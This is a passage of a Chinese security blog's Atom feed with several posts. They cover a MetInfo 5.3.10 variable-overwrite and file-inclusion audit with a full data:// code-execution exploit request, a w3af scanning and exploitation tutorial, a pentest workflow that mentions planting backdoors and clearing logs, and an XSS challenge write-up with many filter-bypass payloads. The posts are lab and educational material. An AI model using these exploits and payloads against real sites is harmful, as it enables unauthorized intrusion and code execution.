+<p>登录检测的，当后台开启登录校验码的时候$met_login_code会设置为1，然后require_once 去包含校验码登录文件。只要我们控制了变量$depth就可以进行远程文件包含了。</p>
+<p>而$depth变量是在文件’admin/login/login_check.php’开头定义的。</p>
+<pre><code>error_reporting(E_ERROR | E_WARNING | E_PARSE);
+if($depth!=&apos;&apos;&amp;&amp;$depth!=&apos;../&apos;&amp;&amp;$depth!=&apos;../../&apos;){die();}
+if(!isset($depth))$depth=&apos;&apos;;
+$commonpath=$depth.&apos;include/common.inc.php&apos;;
+$commonpath=$admin_index?$commonpath:&apos;../&apos;.$commonpath;
+define(&apos;SQL_DETECT&apos;,1);
+</code></pre><p>通过第一次拼接$depth包含了include/common.inc.php，前面几步可能没什么问题，这一步也没有问题的，包含了文件common.inc.php之后，但是common.inc.php中可以通过以下代码进行变量覆盖。</p>
+<p>文件：include/common.inc.php：35</p>
+<pre><code>foreach(array(&apos;_COOKIE&apos;, &apos;_POST&apos;, &apos;_GET&apos;) as $_request) {    // 遍历数组
+
+// $$_request分别是$_COOKIE, $_POST, $_GET，对应http请求提交过来的相应数据
+    foreach($$_request as $_key =&gt; $_value) {           // 分别遍历该数据
+
+        $_key{0} != &apos;_&apos; &amp;&amp; $$_key = daddslashes($_value,0,0,1);     // 对数据中的值进行转义
+        $_M[&apos;form&apos;][$_key] = daddslashes($_value,0,0,1);
+    }
+}
+</code></pre><p>对页面提交过来的数据，包括cookie，post, get三种数据进行转义。</p>
+<p>但是此处却存在一个变量覆盖漏洞，这里我们简单本地演示一下：</p>
+<pre><code>&lt;?php
+
+$a=&apos;hello&apos;;
+foreach($_GET as $key =&gt; $value){
+$$key = $value;
+}
+print $a;
+?&gt;
+</code></pre><p><img src="http://i1.piimg.com/567571/d5b5e87512c79439.png" alt=""> </p>
+<p>当我们get提交一个a值时，它会覆盖掉以前所定义，产生变量覆盖<br><img src="http://i1.piimg.com/567571/4b634cadfa654e5f.png" alt=""></p>
+<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>我们可以利用变量覆盖漏洞覆盖掉变量$deph。</p>
+<p>本地文件包含用require_once来执行代码，但是</p>
+<pre><code>if($depth!=&apos;&apos;&amp;&amp;$depth!=&apos;../&apos;&amp;&amp;$depth!=&apos;../../&apos;){die();}
+</code></pre><p>对depth进行了过滤，我们可以使用php的封装协议data://配合require_once来进行恶意代码执行。<br>还有一个问题</p>
+<pre><code>require_once $depth.&apos;../include/captcha.class.php&apos;;
+</code></pre><p>这一串拼接在字符后面的字符串的干扰，这一段会干扰我们想要执行的代码。</p>
+<p>用base64解码正常文字会让后面这一串字符变成乱码，并且加上了单行注释符号注释掉乱码。</p>
+<p>封装器解码之后代码的样子</p>
+<p>&lt;?php phpinfo();exit();// ..þ)Üç^ýÆ©µÈZ.rV¬s.php</p>
+<p>这样我们构造exp进行测试，前提后台开启了登录验证码：</p>
+<pre><code>POST /MetInfo_5.3.10/admin/login/login_check.php?langset=cn&amp;depth=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw== HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 83
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://127.0.0.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://127.0.0.1/MetInfo_5.3.10/admin/login/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: _ga=GA1.1.1522517218.1476456267; tablepage_json=0%7Csystem%2Cnews%2Cdonews_info; ft127001=0; recordurl=%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn; re_url=http%3A%2F%2F127.0.0.1%2FMetInfo_5.3.10%2Fadmin%2F; met_capcha=1f1ezzrSrlMNL9bl5TC1%2F2CBMinv2dvD8CX74vlrMRbq
+Connection: close
+
+action=login&amp;login_name=admin&amp;login_pass=123456&amp;code=8CAA&amp;Submit=%E7%99%BB%E5%BD%95
+</code></pre><p>执行了phpinfo()<br><img src="http://p1.bpimg.com/567571/029868dcb218554d.png" alt=""></p>
+<p>因为使用了data://，所以需要php.ini 中allow_url_include ＝on</p>
+<h3 id="0x04、漏洞修复"><a href="#0x04、漏洞修复" class="headerlink" title="0x04、漏洞修复"></a>0x04、漏洞修复</h3><p>包含include/common.inc.php再次给$depth赋值，防止变量被污染</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x00-MetInfo&quot;&gt;&lt;a href=&quot;#0x00-MetInfo&quot; class=&quot;headerlink&quot; title=&quot;0x00 MetInfo&quot;&gt;&lt;/a&gt;0x00 MetInfo&lt;/h3&gt;&lt;p&gt;MetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。&lt;/p&gt;
+&lt;h3 id=&quot;0x01-命令执行-文件包含&quot;&gt;&lt;a href=&quot;#0x01-命令执行-文件包含&quot; class=&quot;headerlink&quot; title=&quot;0x01 命令执行 文件包含&quot;&gt;&lt;/a&gt;0x01 命令执行 文件包含&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;命令执行：&lt;/strong&gt;应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、&lt;br&gt;passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令&lt;br&gt;拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>w3af初级</title>
+    <link href="http://yoursite.com/2016/11/22/w3af%E5%88%9D%E7%BA%A7/"/>
+    <id>http://yoursite.com/2016/11/22/w3af初级/</id>
+    <published>2016-11-22T04:09:54.000Z</published>
+    <updated>2016-11-22T04:13:40.782Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-w3af"><a href="#0x01-w3af" class="headerlink" title="0x01 w3af"></a>0x01 w3af</h3><p>w3af是一个完整的web应用攻击和漏洞分析环境。该环境为web漏洞的分析和测试提供了一个课信赖的平台。<br>w3af是一个Web应用程序攻击和检查框架，该项目已超过130个插件，其中包括检查网站爬虫,SQL注入(SQL Injection),跨站(XSS),本地文件包含(LFI),远程文件包含(RFI)等<br><a id="more"></a></p>
+<h3 id="0x02-Linux下安装与启动"><a href="#0x02-Linux下安装与启动" class="headerlink" title="0x02 Linux下安装与启动"></a>0x02 Linux下安装与启动</h3><pre><code>apt-get install w3af   #安装
+cd +安装目录             #启动
+./w3af_console
+</code></pre><p><strong><em>补充一个小知识点：</em></strong><br>Linux下查看运行文件所在路径：<strong>which</strong><br>eg:which w3af<br>Linux下查看文件安装路径：<strong>whereis</strong><br>eg:whereis w3af<br><img src="http://obh1qcqek.bkt.clouddn.com/329.jpg" alt=""></p>
+<p>由于kali Linux自带有w3af，所以我们可以直接启动它，</p>
+<pre><code>w3af           #图形界面
+w3af_console   #控制台界面
+</code></pre><p><img src="http://obh1qcqek.bkt.clouddn.com/833.jpg" alt=""></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/658.jpg" alt=""><br>推荐大家使用控制台界面</p>
+<h3 id="0x03-w3af基本插件"><a href="#0x03-w3af基本插件" class="headerlink" title="0x03 w3af基本插件"></a>0x03 w3af基本插件</h3><p>W3af主要有三种主要类型的插件：<br><strong>Discovery：</strong>抓取插件，主要负责寻找url，其实就是网络爬虫。<br><strong>Audit：</strong>审计插件，主要负责发现抓取插件爬取的url中是否存在安全漏洞。<br><strong>Attack：</strong>攻击插件，主要是去利用审计插件发现的漏洞。<br>其他插件：<br>discovery:漏洞挖掘<br>exploit: 漏洞利用<br>Infrastructure：确定目标的基本信息，如安装的waf、操作系统等。<br>Grep：分析其他插件发送的HTTP请求和响应，并确定漏洞。<br>Output：输出插件，可以将数据保存到文本文件、XML文件或HTML文件。<br>Mangle：允许以基于正则表达式的方式修改网络请求和响应。<br>Bruteforce：进行暴力破解登录信息<br>Evasion：用于逃避简单的入侵检测。</p>
+<p>首先我们查看帮助信息，有利于我们了解它的操作使用<br><img src="http://obh1qcqek.bkt.clouddn.com/391.jpg" alt=""></p>
+<h3 id="0x04-w3af基本原理和使用"><a href="#0x04-w3af基本原理和使用" class="headerlink" title="0x04 w3af基本原理和使用"></a>0x04 w3af基本原理和使用</h3><h4 id="1、基本原理"><a href="#1、基本原理" class="headerlink" title="1、基本原理"></a>1、基本原理</h4><p>1.1 <strong>漏洞挖掘(Discovery)</strong><br>搜寻新的URL、表单和其他注入点，使用Crawl抓取插件进行漏洞挖掘。Web spider是一个经典的漏洞挖掘插件。这个插件以一个URL为输入，然后得到一个或多个注入点。当用户使用多个这种类型的插件时，这些插件会运行这样的循环：如果插件A在第一次运行时发现了一个新的URL，w3af内核将这个URL传递给插件B。如果插件B发现了一个新的URL，也将发送给A。这个过程将一直持续下去，所有的插件都将会工作。占用应用资源，直到无法运行漏洞挖掘应用。<br>1.2 <strong>漏洞分析(Audit)</strong><br>分析那些有漏洞挖掘插件找到的注入点，为了发现漏洞，漏洞分析插件会向所有可注入点发送他别设计好的数据。例如使用一个漏洞分析插件来获取SQL注入的漏洞<br>1.3 <strong>漏洞攻击(Attack)</strong><br>利用分析插件发现的漏洞。他们通常会得到一个远程服务器的shell或者一个利用SQL注入漏洞获取的远程数据库表。</p>
+<h4 id="2、基本使用"><a href="#2、基本使用" class="headerlink" title="2、基本使用"></a>2、基本使用</h4><p>2.1 <strong>插件配置</strong><br>plugins，遇到问题都可以使用help查看帮助<br><img src="http://obh1qcqek.bkt.clouddn.com/4146.jpg" alt=""></p>
+<pre><code>w3af&gt;&gt;&gt; plugins    #进入插件模块
+w3af/plugins&gt;&gt;&gt; list crawl   #列出所有用于发现的插件
+w3af/plugins&gt;&gt;&gt; crawl find_backdoors phpinfo web_spider      //启用这三个扫描插件插件
+w3af/plugins&gt;&gt;&gt; list audit    #列出所有用于漏洞的插件
+w3af/plugins&gt;&gt;&gt; audit blindSqli fileUpload osCommanding sqli xss     #启用blindSqli fileUpload osCommanding sqli xss这五个插件
+w3af/plugins&gt;&gt;&gt; back    #返回主模块
+</code></pre><p>查看某一插件内部信息</p>
+<pre><code>w3af/plugins&gt;&gt;&gt;audit desc xss  #了解插件作用
+w3af/plugins&gt;&gt;&gt;audit config xss
+w3af/plugins/audit/config:xss&gt;&gt;&gt;view
+</code></pre><p><img src="http://obh1qcqek.bkt.clouddn.com/825.jpg" alt=""></p>
+<p>2.2 <strong>漏洞扫描</strong><br>设置扫描目标,自己本地搭建环境进行测试</p>
+<pre><code>w3af&gt;&gt;&gt; target    #进入配置目标的模块
+w3af/config:target&gt;&gt;&gt; set target http://192.168.1.105/sqli-labs/Less-1/ #设置攻击目标
+w3af/config:target&gt;&gt;&gt; back
+w3af&gt;&gt;&gt; start     #开始扫描
+</code></pre><p><img src="http://obh1qcqek.bkt.clouddn.com/257.jpg" alt=""><br>2.3 <strong>漏洞利用</strong><br>使用扫描出的漏洞进行攻击</p>
+<pre><code>w3af&gt;&gt;&gt; exploit    #进入漏洞利用模块
+w3af/exploit&gt;&gt;&gt; list exploit    #列出所有用于漏洞利用的插件
+w3af/exploit&gt;&gt;&gt; exploit sqlmap  #选择sqlmap进行利用
+</code></pre><p><img src="http://obh1qcqek.bkt.clouddn.com/786.jpg" alt=""><br>他可以和sqlmap进行联动,发现存在sql注入</p>
+<pre><code>w3af/exploit&gt;&gt;&gt; interact 0  #获得交换式模块
+w3af/exploit/sqlmap-0&gt;&gt;&gt; dbs #获得数据库名
+</code></pre><p>其实w3af还有好多的功能和用处，功能还不错，这里只是简单的介绍了他的初级使用，大家有兴趣的话可以继续研究下去。</p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/785.jpg" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-w3af&quot;&gt;&lt;a href=&quot;#0x01-w3af&quot; class=&quot;headerlink&quot; title=&quot;0x01 w3af&quot;&gt;&lt;/a&gt;0x01 w3af&lt;/h3&gt;&lt;p&gt;w3af是一个完整的web应用攻击和漏洞分析环境。该环境为web漏洞的分析和测试提供了一个课信赖的平台。&lt;br&gt;w3af是一个Web应用程序攻击和检查框架，该项目已超过130个插件，其中包括检查网站爬虫,SQL注入(SQL Injection),跨站(XSS),本地文件包含(LFI),远程文件包含(RFI)等&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试流程</title>
+    <link href="http://yoursite.com/2016/11/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
+    <id>http://yoursite.com/2016/11/21/渗透测试流程/</id>
+    <published>2016-11-21T12:48:12.000Z</published>
+    <updated>2016-11-21T12:52:31.761Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-渗透测试"><a href="#0x01-渗透测试" class="headerlink" title="0x01 渗透测试"></a>0x01 渗透测试</h3><p>渗透测试是通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法。可以对一些网站等进行安全风险评估，以便提高其安全性。<br>测试人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络所有者根据渗透人员提供的渗透测试报告，可以清晰知晓系统中存在的安全隐患和问题。<br><a id="more"></a><br>现在主要有<strong>黑盒测试、白盒测试和灰盒测试</strong>，黑盒测试就是提供一个网站，我们完全模拟黑客攻击进行测试，白盒测试提供源代码，主要是代码审计找漏洞，而灰盒测试则两者都提供。<br>下面我们介绍的主要是黑盒测试流程。</p>
+<h3 id="0x02-主要步骤"><a href="#0x02-主要步骤" class="headerlink" title="0x02 主要步骤"></a>0x02 主要步骤</h3><p>渗透主要有以下七个步骤：<strong>信息搜集、漏洞挖掘、漏洞利用、权限提升、后门、日志清扫、经验总结</strong>。</p>
+<h3 id="0x03-信息搜集"><a href="#0x03-信息搜集" class="headerlink" title="0x03 信息搜集"></a>0x03 信息搜集</h3><p>当我们检测一个网站时，首先要做的就是信息搜集工作，这个是十分有必要的，可以为我们后期测试提供事半功倍的效果。<br>Whois信息–注册人、电话、邮箱、DNS、地址，必要时可以进行社工；<br>Googlehack–敏感目录、敏感文件、更多信息收集；<br>服务器IP–Nmap扫描、端口对应的服务、C段；<br>旁注–Bing查询、脚本工具，当主网站拿不下是，我们可以利用旁注、C段等继而拿下主站；<br>如果遇到CDN–Cloudflare（绕过）、从子域入手（mail，postfix）、DNS传送域漏洞；<br>服务器、组件（指纹）–操作系统、web server（apache，nginx，iis）、脚本语言；</p>
+<p>通过信息收集阶段，我们已经基本上能够获取到网站的绝大部分信息，当然信息收集作为网站入侵的第一步，决定着后续入侵的成功。</p>
+<h3 id="0x04-漏洞挖掘"><a href="#0x04-漏洞挖掘" class="headerlink" title="0x04 漏洞挖掘"></a>0x04 漏洞挖掘</h3><p>漏洞挖掘得靠我们平时的基本功和积累了，白盒测试的话主要看我们的代码审计能力。<br>探测Web应用指纹–Discuz、PHPwind、Dedecms、Ecshop…，可以判断是否存在爆出来的一些漏洞，有开源的还可以进行代码审计；<br>XSS、CSRF、XSIO、SQL注入、权限绕过、任意文件读取、文件包含…等常见OWASP-Top 10漏洞；<br>上传漏洞–截断、修改、解析漏洞；<br>有无验证码–可以对其进行暴力破解；<br>经过前期两个阶段，我们手里已经掌握了网站的大量信息以及不大不小的漏洞若干，下一步我们就可以进一步利用这些漏洞获取网站权限。</p>
+<h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><p>这一步也是重要的一步，具有承上启下的作用<br>遇到一些特殊情况，需要自己挖掘漏洞；<br>思考目的性–想要达到什么样的效果；<br>隐藏，破坏性–根据探测到的应用指纹寻找对应的EXP攻击载荷或者自己编写；<br>开始漏洞攻击，获取相应权限，根据场景不同变化思路拿到webshell；<br>还可以利用DDOS或者社工；</p>
+<h3 id="0x06-权限提升"><a href="#0x06-权限提升" class="headerlink" title="0x06 权限提升"></a>0x06 权限提升</h3><p>根据自己的目的确定是否需要进行提权；<br>根据服务器类型选择不同的攻击载荷进行权限提升；<br>法进行权限提升，结合获取的资料开始密码猜解，回溯信息收集；</p>
+<h3 id="0x07-后门"><a href="#0x07-后门" class="headerlink" title="0x07 后门"></a>0x07 后门</h3><p>植入后门是方便我们下次进入的方便；<br>要具有隐蔽性；<br>定期查看并更新，保持周期性；<br>做好免杀工作（web层、系统层）；</p>
+<h3 id="0x08-日志清理"><a href="#0x08-日志清理" class="headerlink" title="0x08 日志清理"></a>0x08 日志清理</h3><p>为了隐蔽我们的痕迹，日志清理<br>伪装性，隐蔽性，避免激警他们通常选择删除指定日志<br>根据时间段，find相应日志文件；<br>要具有严谨性，贯穿整个渗透过程；</p>
+<h3 id="0x09-经验总结（检测报告）"><a href="#0x09-经验总结（检测报告）" class="headerlink" title="0x09 经验总结（检测报告）"></a>0x09 经验总结（检测报告）</h3><p>平时渗透测试的就总结、归纳、整理每次渗透的经验，以及遇到的问题和解决方法，在总结中不断地提升自己。<br>而作为渗透测试人员，测试报告是对工作的总结，包括管理层报告（风险级别。风险分类、整改规划）和技术报告（漏洞细节、漏洞复现、修补方案）。</p>
+<h3 id="0x10-后记"><a href="#0x10-后记" class="headerlink" title="0x10 后记"></a>0x10 后记</h3><p>在我们渗透测试的时候只需要进行前三步骤就达到了我们的测试要求了，后面那些是没有必要继续进行的，但是总结报告还是要写的，有助于提升我们的实例。<br><strong><em>附上一个渗透测试流程图：</em></strong><br><img src="http://i1.piimg.com/567571/1560e1318d6bfc4f.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-渗透测试&quot;&gt;&lt;a href=&quot;#0x01-渗透测试&quot; class=&quot;headerlink&quot; title=&quot;0x01 渗透测试&quot;&gt;&lt;/a&gt;0x01 渗透测试&lt;/h3&gt;&lt;p&gt;渗透测试是通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法。可以对一些网站等进行安全风险评估，以便提高其安全性。&lt;br&gt;测试人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络所有者根据渗透人员提供的渗透测试报告，可以清晰知晓系统中存在的安全隐患和问题。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XSS Challenges</title>
+    <link href="http://yoursite.com/2016/11/20/XSS-Challenges/"/>
+    <id>http://yoursite.com/2016/11/20/XSS-Challenges/</id>
+    <published>2016-11-20T06:12:56.000Z</published>
+    <updated>2016-11-20T06:14:38.495Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01、前言"><a href="#0x01、前言" class="headerlink" title="0x01、前言"></a>0x01、前言</h3><p>最近发现了一个挺好玩的XSS练习平台，大家可以没事了玩一玩。至于相关知识，已经在以前的博客上介绍过，大家对于基础可去看看。<a href="http://xss-quiz.int21h.jp" target="_blank" rel="external">练习平台</a>、<a href="http://zjw.dropsec.xyz/2016/08/05/xss%E5%9F%BA%E7%A1%80/" target="_blank" rel="external">基础知识</a>，好了，不多说，我们开撸<br><a id="more"></a><br><img src="http://i1.piimg.com/567571/a983e7d934a1ae55.png" alt=""></p>
+<p>我们要做的就是alert(document.domain)，还有提示，我们只要在搜索框输入即可。<br>我们可以每次都输入一个数字例如123测试下</p>
+<h3 id="0x02、具体实现过程"><a href="#0x02、具体实现过程" class="headerlink" title="0x02、具体实现过程"></a>0x02、具体实现过程</h3><p>1、首先输入123测试我们输入存在的位置，查看源代码发现并没有什么标签包尾</p>
+<pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre><p>第一题比较简单，这样可直接弹出</p>
+<p>2、继续先测试，发现被放进了标签里，那么我们首先得闭合标签</p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;&quot;
+</code></pre><p>也可以直接在标签里触发：(单击search输入框)</p>
+<pre><code>&quot; onclick=alert(document.domain) value=&quot;asd
+</code></pre><p>3、测试发现没有被标签所包含，所以输入最简单的进行                    </p>
+<pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre><p>发现&lt;&gt;被转义了，<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20161119201515017.jpg" alt=""></p>
+<p>Hint:The input in text box is properly escaped.<br>可以用burp进行抓包，将p2处继续插入,可以弹出               </p>
+<pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre><p><img src="http://p1.bpimg.com/567571/2707925b245610f7.png" alt=""></p>
+<p>4、Hint:invisible input field<br>发现一个隐藏的提交框，复原后进行测试发现p3被标签包围，和2差不多，闭合标签</p>
+<pre><code>&quot;&gt;;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;&quot;
+</code></pre><p><img src="http://p1.bqimg.com/567571/d6d387d8b01baf15.png" alt=""></p>
+<p>5、Hint:length limited text box<br>测试还是得闭合标签，并且修改长度<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20161119211206481.jpg" alt=""></p>
+<pre><code>&quot;&gt;;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;&quot;
+</code></pre><p>6、Hint:event handler attributes</p>
+<p>测试发现被标签包围，老套路</p>
+<pre><code>&quot;&gt;;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;&quot;
+</code></pre><p><img src="http://obh1qcqek.bkt.clouddn.com/27.jpg" alt=""><br>发现转义了&gt;&lt;，那么我们可以使用on事件在input内触发</p>
+<pre><code>&quot; onclick=alert(document.domain) value=&quot;asd
+</code></pre><p>7、Hint:nearly the same… but a bit more tricky.</p>
+<p>继续测试，发现这次”和&gt;&lt;都被转义了，真是太可怕了。<br><img src="http://obh1qcqek.bkt.clouddn.com/712.jpg" alt=""></p>
+<pre><code>&quot; onclick=alert(document.domain)
+</code></pre><p>依然可以，因为第一个符号只是被当成显示的内容所显示出来，换其他字符同样可以得出</p>
+<p>8、Hint:the ‘javascript’ scheme.</p>
+<p>进行测试发现输入的构造成了一个链接，<br><img src="http://obh1qcqek.bkt.clouddn.com/912.jpg" alt=""><br>使用</p>
+<pre><code>javascript:alert(document.domain);
+</code></pre><p>当点击这个链接时，会构造出弹框。</p>
+<p>9、Hint:UTF-7 XSS<br>必须使用IE 8.0 进行提交可以实现</p>
+<pre><code>具体方法：
+XSS CODE:  &lt;script&gt;alert(document.domain)&lt;/script&gt;
+UTF-7 XSS Encode:  +ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-
+</code></pre><p>将 UTF-7 XSS Encode 添上 UTF-7 Bom 让它成为 UTF-7 的编码</p>
+<pre><code>+/v8 +ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-
+</code></pre><p>Bom 与 Encode 之间有一个空格<br>在bom与encode之间也可以存在其他代码，<br>如：+/v8 just for fun +ADw-script+AD4-alert(’90sec’)+ADw-/script+AD4-<br>如果是POST提交，就可以直接把 UTF-7 编码字符提交出去<br>如果是GET方式，得先把编码字符进行URL转码，因为浏览器会吞掉+号</p>
+<p>10、Hint:s/domain//g;<br>提交之后发现过滤了domain，可以进行双写绕过他</p>
+<pre><code>&quot; onclick=alert(document.domdomainain) value=&quot;asd
+</code></pre><p>11、Hint:s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;</p>
+<p>分别输入上面两个常用的发现script转化为xscript、on转换为onxxx</p>
+<pre><code>&quot;&gt;&lt;iframe src=&quot;javascr&amp;#09;ipt:alert(document.domain);&quot;&gt;&lt;/iframe&gt;
+</code></pre><p>可以弹出，避免使用了script和on</p>
+<p>12、Hint:”s/[\x00-\x20\&lt;\&gt;\”\’<br>经过测试，过滤了尖括号、双引号、空格</p>
+<pre><code>``onmouseover=alert(document.domain);
+</code></pre><p>onmouseover属性在鼠标指针移动到元素上时触发。</p>
+<p>13、Hint:style attribute<br>将&lt;&gt;和”进行了转义<br>考察的是CSS样式属性的XSS，在CSS样式中利用expression实现JavaScript中的onmouseover/onmouseout事件</p>
+<pre><code>expression(onmouseover=function(){alert(document.domain)})
+</code></pre><p>在IE下实现。</p>
+<p>14、Hint:s/(url|script|eval|expression)/xxx/ig</p>
+<p>正则过滤了这几个敏感数，加入注释符即可绕过</p>
+<pre><code>expre/**/ssion(onmouseover=function(){alert(document.domain)})
+</code></pre><p>15、Hint:document.write();</p>
+<p>对&gt;&lt;进行了编码，而且处在document.write()函数中，可以对&gt;&lt;进行16进制编码</p>
+<pre><code>\\x3Cscript\\x3Ealert(document.domain)\\x3C/script\\x3E
+</code></pre><p>16、Hint:”document.write();” and “s/\x/\\x/ig;”<br>和15差不多，就是进行了Unicode编码</p>
+<pre><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
+</code></pre><p>17、Hint:multi-byte character<br>思路跟php宽字节注入一样，输入某个特殊的字节，吃掉双引号,%A7闭合最后的双引号<br>    1%A7&amp;p2=+onmouseover%3Dalert%28document.domain%29%3B+%A7</p>
+<p>18、Hint:us-ascii high bit issue</p>
+<pre><code>%A2%BE%BCscript%BEalert(document.domain);%BC/script%BE
+</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01、前言&quot;&gt;&lt;a href=&quot;#0x01、前言&quot; class=&quot;headerlink&quot; title=&quot;0x01、前言&quot;&gt;&lt;/a&gt;0x01、前言&lt;/h3&gt;&lt;p&gt;最近发现了一个挺好玩的XSS练习平台，大家可以没事了玩一玩。至于相关知识，已经在以前的博客上介绍过，大家对于基础可去看看。&lt;a href=&quot;http://xss-quiz.int21h.jp&quot;&gt;练习平台&lt;/a&gt;、&lt;a href=&quot;http://zjw.dropsec.xyz/2016/08/05/xss%E5%9F%BA%E7%A1%80/&quot;&gt;基础知识&lt;/a&gt;，好了，不多说，我们开撸&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+  </entry>
+  
+</feed>
